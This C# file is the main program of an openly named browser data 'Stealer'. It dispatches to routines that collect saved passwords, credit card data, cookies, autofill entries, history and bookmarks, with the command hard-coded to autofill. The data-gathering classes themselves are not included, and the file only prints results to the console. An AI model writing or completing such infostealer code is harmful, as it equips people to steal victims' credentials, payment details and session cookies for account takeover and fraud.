using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stealer
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Starting..");

            //if (args.Length < 1)
            //{
            //    Console.WriteLine("Please select command [PASSWORDS/HISTORY/COOKIES/AUTOFILL/CREDIT_CARDS/BOOKMARKS]");
            //    Environment.Exit(1);
            //}

            switch ("AUTOFILL")
            {
                case "PASSWORDS":
                    {
                        BrowserUtils.ShowPasswords(Passwords.Get());
                        break;
                    }

                case "CREDIT_CARDS":
                    {
                        BrowserUtils.ShowCreditCards(CreditCards.Get());
                        break;
                    }

                case "COOKIES":
                    {
                        BrowserUtils.ShowCookies(Cookies.Get());
                        break;
                    }

                case "BOOKMARKS":
                    {
                        BrowserUtils.ShowBookmarks(Bookmarks.Get());
                        break;
                    }

                case "HISTORY":
                    {
                        BrowserUtils.ShowHistory(History.Get());
                        break;
                    }
                case "AUTOFILL":
                    {
                        BrowserUtils.ShowAutoFill(Autofill.Get());
                        break;
                    }

                default:
                    {
                        Console.WriteLine("Command not found!");
                        break;
                    }
            }
        }
    }
}
